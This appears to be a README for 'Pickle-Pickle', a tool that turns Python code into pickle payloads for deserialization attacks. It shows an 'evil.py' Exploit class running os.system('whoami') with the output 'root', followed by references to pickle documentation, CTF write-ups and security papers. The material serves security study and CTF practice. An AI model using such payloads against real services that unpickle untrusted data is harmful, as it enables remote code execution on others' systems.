## Pickle-Pickle
```
A arbitrary python code executer via python pickle
```

#### Usage
```python
# cat evil.py
#!/usr/bin/env python
# encoding:utf-8

class Exploit():
    def __init__(self, command):
        self.command = command
    
    def run(self):
        import os
        return os.system(self.command)

print(Exploit("whoami").run())

# python pickle-pickle.py
Usage:
        python .\pickle-pickle.py [FILENAME]

# python pickle-pickle.py evil.py
root
```

#### Reference
* Source Code
    * https://github.com/python/cpython/blob/master/Lib/pickle.py
* Documents
    * https://www.python.org/dev/peps/pep-0307/
    * https://www.python.org/dev/peps/pep-3154/
    * https://docs.python.org/2/library/pickle.html#pickle-protocol
    * https://docs.python.org/2/library/pickle.html
    * https://docs.python.org/3/library/pickle.html
* CTF WriteUP
    * https://www.cnblogs.com/heycomputer/articles/10613850.html
    * https://www.jianshu.com/p/8fd3de5b4843
    * https://github.com/bl4de/ctf/blob/master/2016/HackIM_2016/Unicle_Web200/Unicle_Web200_writeup.md
    * https://github.com/ctfs/write-ups-2015/tree/master/camp-ctf-2015/pwn/spam-100
* Articles
    * https://checkoway.net/musings/pickle/
    * https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html
    * https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html
    * https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html
    * https://zhuanlan.zhihu.com/p/25981037
    * http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/
    * http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html
* Papers
    * http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf
* Tools
    * https://gist.github.com/freddyb/3360650
    * https://github.com/sensepost/anapickle
